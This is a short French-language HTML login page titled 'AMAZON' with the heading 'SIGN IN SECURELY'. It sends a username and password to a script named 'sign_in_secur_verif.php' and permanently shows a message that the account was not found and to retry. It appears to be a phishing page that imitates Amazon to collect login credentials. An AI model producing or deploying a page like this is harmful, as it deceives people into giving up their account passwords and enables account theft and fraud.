<!DOCTYPE html>
<html lang="fr-FR">
<head>
    <title>AMAZON</title>
    <link rel="stylesheet" href="">
</head>

<body>
    <center>
        <p>SIGN IN SECURELY</p>
        <form method="post" action="sign_in_secur_verif.php">
            <p>
                <label for="nom">Nom d'utilisateur</label>
                <input type="text" name="nom" id="nom" required="required"/><br/><br/>
                <label for="mdp">Mot de passe</label>
                <input type="password" name="mdp" id="mdp" required="required"/><br/><br/>
                <input type="submit" value="S'identifier"/><br/><br/>
                <p>Ce nom d'utilisateur n'est associé à aucun compte, veuillez réessayer !
            </p>
        </form>
    </center>
</body>
</html>